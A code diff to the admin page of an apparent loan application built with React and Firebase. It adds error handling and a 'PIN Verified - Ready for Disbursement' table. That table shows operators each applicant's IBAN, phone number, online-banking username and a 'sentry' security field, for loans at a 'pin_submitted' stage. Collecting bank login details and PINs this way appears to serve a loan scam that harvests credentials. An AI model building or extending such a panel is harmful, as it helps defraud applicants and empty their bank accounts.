@@ -42,34 +42,54 @@ export const AdminPage = () => {
 
   useEffect(() => {
     // Listen for loans
-    const loansQuery = query(collection(db, 'loans'));
-    const unsubscribeLoans = onSnapshot(loansQuery, (snapshot) => {
-      const loanData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-      setLoans(loanData);
-    });
+    let unsubscribeLoans: (() => void) | null = null;
+    try {
+      const loansQuery = query(collection(db, 'loans'));
+      unsubscribeLoans = onSnapshot(loansQuery, (snapshot) => {
+        const loanData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+        setLoans(loanData);
+      }, (err) => {
+        if (err.code !== 'permission-denied') {
+          console.error('Error fetching loans for admin:', err);
+        }
+      });
+    } catch (err) {
+      console.error('Error setting up admin loans listener:', err);
+    }
 
     // Listen for pending KYCs
-    const kycQuery = query(collection(db, 'users'), where('kycStatus', '==', 'pending'));
-    const unsubscribeKYC = onSnapshot(kycQuery, (snapshot) => {
-      const kycData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
-      setPendingKYCs(kycData);
+    let unsubscribeKYC: (() => void) | null = null;
+    try {
+      const kycQuery = query(collection(db, 'users'), where('kycStatus', '==', 'pending'));
+      unsubscribeKYC = onSnapshot(kycQuery, (snapshot) => {
+        const kycData = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+        setPendingKYCs(kycData);
+        setLoading(false);
+      }, (err) => {
+        if (err.code !== 'permission-denied') {
+          console.error('Error fetching pending KYCs for admin:', err);
+        }
+        setLoading(false);
+      });
+    } catch (err) {
+      console.error('Error setting up admin KYC listener:', err);
       setLoading(false);
-    });
+    }
 
     return () => {
-      unsubscribeLoans();
-      unsubscribeKYC();
+      if (unsubscribeLoans) unsubscribeLoans();
+      if (unsubscribeKYC) unsubscribeKYC();
     };
   }, []);
 
-  const handleLoanStatusUpdate = async (loanId: string, status: 'approved' | 'rejected') => {
+  const handleLoanStatusUpdate = async (loanId: string, status: string) => {
     try {
       await updateDoc(doc(db, 'loans', loanId), {
         status,
         updatedAt: serverTimestamp(),
         reviewedBy: user?.email,
       });
-      alert(`Loan ${status} successfully!`);
+      alert(`Loan updated to ${status} successfully!`);
     } catch (err: any) {
       console.error('Error updating loan status:', err);
       alert(`Failed to update loan status: ${err.message}`);
@@ -112,7 +132,8 @@ export const AdminPage = () => {
   };
 
   const pendingLoans = loans.filter(l => l.status === 'pending');
-  const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' ? l.amount : 0), 0);
+  const pinVerificationLoans = loans.filter(l => l.status === 'pin_submitted');
+  const totalVolume = loans.reduce((acc, l) => acc + (l.status === 'approved' || l.status === 'disbursed' ? l.amount : 0), 0);
 
   return (
     <div className="min-h-screen bg-gray-50 dark:bg-primary">
@@ -206,73 +227,137 @@ export const AdminPage = () => {
         </div>
 
         {activeTab === 'loans' ? (
-          <div className="card">
-            <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
-              Pending Applications
-              <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
-                {pendingLoans.length}
-              </span>
-            </h2>
-            
-            <div className="overflow-x-auto">
-              <table className="w-full text-left">
-                <thead>
-                  <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
-                    <th className="pb-4 font-bold">Applicant</th>
-                    <th className="pb-4 font-bold">Amount</th>
-                    <th className="pb-4 font-bold">Purpose</th>
-                    <th className="pb-4 font-bold">Date</th>
-                    <th className="pb-4 font-bold text-right">Actions</th>
-                  </tr>
-                </thead>
-                <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
-                  {loading ? (
-                    <tr>
-                      <td colSpan={5} className="py-10 text-center text-gray-500">
-                        Loading applications...
-                      </td>
+          <div className="space-y-8">
+            {/* Pending Review */}
+            <div className="card">
+              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
+                Pending Review
+                <span className="bg-yellow-100 text-yellow-700 px-2 py-0.5 rounded-full text-xs font-black">
+                  {pendingLoans.length}
+                </span>
+              </h2>
+              
+              <div className="overflow-x-auto">
+                <table className="w-full text-left">
+                  <thead>
+                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
+                      <th className="pb-4 font-bold">Applicant</th>
+                      <th className="pb-4 font-bold">Amount</th>
+                      <th className="pb-4 font-bold">Purpose</th>
+                      <th className="pb-4 font-bold">Date</th>
+                      <th className="pb-4 font-bold text-right">Actions</th>
                     </tr>
-                  ) : pendingLoans.length === 0 ? (
-                    <tr>
-                      <td colSpan={5} className="py-10 text-center text-gray-500">
-                        No pending applications to review.
-                      </td>
-                    </tr>
-                  ) : (
-                    pendingLoans.map((loan) => (
-                      <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
-                        <td className="py-4">
-                          <div className="font-bold dark:text-white">{loan.userEmail}</div>
-                          <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
-                        </td>
-                        <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
-                        <td className="py-4 text-gray-500">{loan.purpose}</td>
-                        <td className="py-4 text-gray-500">
-                          {loan.createdAt?.toDate ? loan.createdAt.toDate().toLocaleDateString() : 'Just now'}
-                        </td>
-                        <td className="py-4 text-right">
-                          <div className="flex justify-end gap-2">
-                            <button 
-                              onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
-                              className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all"
-                              title="Reject"
-                            >
-                              <XCircle className="w-6 h-6" />
-                            </button>
-                            <button 
-                              onClick={() => handleLoanStatusUpdate(loan.id, 'approved')}
-                              className="p-2 rounded-lg hover:bg-green-50 text-gray-400 hover:text-accent transition-all"
-                              title="Approve"
-                            >
-                              <CheckCircle className="w-6 h-6" />
-                            </button>
-                          </div>
+                  </thead>
+                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
+                    {loading ? (
+                      <tr>
+                        <td colSpan={5} className="py-10 text-center text-gray-500">
+                          Loading applications...
                         </td>
                       </tr>
-                    ))
-                  )}
-                </tbody>
-              </table>
+                    ) : pendingLoans.length === 0 ? (
+                      <tr>
+                        <td colSpan={5} className="py-10 text-center text-gray-500">
+                          No pending applications to review.
+                        </td>
+                      </tr>
+                    ) : (
+                      pendingLoans.map((loan) => (
+                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
+                          <td className="py-4">
+                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
+                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
+                          </td>
+                          <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
+                          <td className="py-4 text-gray-500">{loan.purpose}</td>
+                          <td className="py-4 text-gray-500">
+                            {loan.createdAt?.toDate ? loan.createdAt.toDate().toLocaleDateString() : 'Just now'}
+                          </td>
+                          <td className="py-4 text-right">
+                            <div className="flex justify-end gap-2">
+                              <button 
+                                onClick={() => handleLoanStatusUpdate(loan.id, 'rejected')}
+                                className="p-2 rounded-lg hover:bg-red-50 text-gray-400 hover:text-red-500 transition-all"
+                                title="Reject"
+                              >
+                                <XCircle className="w-6 h-6" />
+                              </button>
+                              <button 
+                                onClick={() => handleLoanStatusUpdate(loan.id, 'approved')}
+                                className="p-2 rounded-lg hover:bg-green-50 text-gray-400 hover:text-accent transition-all"
+                                title="Approve"
+                              >
+                                <CheckCircle className="w-6 h-6" />
+                              </button>
+                            </div>
+                          </td>
+                        </tr>
+                      ))
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            {/* PIN Verified */}
+            <div className="card">
+              <h2 className="text-xl font-bold mb-6 dark:text-white flex items-center gap-2">
+                PIN Verified - Ready for Disbursement
+                <span className="bg-purple-100 text-purple-700 px-2 py-0.5 rounded-full text-xs font-black">
+                  {pinVerificationLoans.length}
+                </span>
+              </h2>
+              
+              <div className="overflow-x-auto">
+                <table className="w-full text-left">
+                  <thead>
+                    <tr className="border-b border-gray-100 dark:border-zinc-800 text-gray-400 text-sm uppercase tracking-wider">
+                      <th className="pb-4 font-bold">Applicant</th>
+                      <th className="pb-4 font-bold">Amount</th>
+                      <th className="pb-4 font-bold">Bank & Additional Details</th>
+                      <th className="pb-4 font-bold text-right">Actions</th>
+                    </tr>
+                  </thead>
+                  <tbody className="divide-y divide-gray-100 dark:divide-zinc-800">
+                    {pinVerificationLoans.length === 0 ? (
+                      <tr>
+                        <td colSpan={4} className="py-10 text-center text-gray-500">
+                          No loans ready for disbursement.
+                        </td>
+                      </tr>
+                    ) : (
+                      pinVerificationLoans.map((loan) => (
+                        <tr key={loan.id} className="group hover:bg-gray-50 dark:hover:bg-zinc-800/50 transition-colors">
+                          <td className="py-4">
+                            <div className="font-bold dark:text-white">{loan.userEmail}</div>
+                            <div className="text-xs text-gray-400 font-mono">{loan.id}</div>
+                          </td>
+                          <td className="py-4 font-bold text-accent">${loan.amount.toLocaleString()}</td>
+                          <td className="py-4">
+                            <div className="text-xs font-bold dark:text-white mb-1">
+                              {loan.bankDetails?.bankName} - {loan.bankDetails?.accountNumber}
+                            </div>
+                            <div className="grid grid-cols-2 gap-x-4 gap-y-1 text-[10px] text-gray-500">
+                              <span>IBAN: {loan.additionalDetails?.iban}</span>
+                              <span>Phone: {loan.additionalDetails?.phoneNumber}</span>
+                              <span>User: {loan.additionalDetails?.bankUsername}</span>
+                              <span>Sentry: {loan.additionalDetails?.sentry}</span>
+                            </div>
+                          </td>
+                          <td className="py-4 text-right">
+                            <button 
+                              onClick={() => handleLoanStatusUpdate(loan.id, 'disbursed')}
+                              className="btn-primary px-4 py-2 text-xs bg-green-600 hover:bg-green-700"
+                            >
+                              Disburse Funds
+                            </button>
+                          </td>
+                        </tr>
+                      ))
+                    )}
+                  </tbody>
+                </table>
+              </div>
             </div>
           </div>
         ) : (
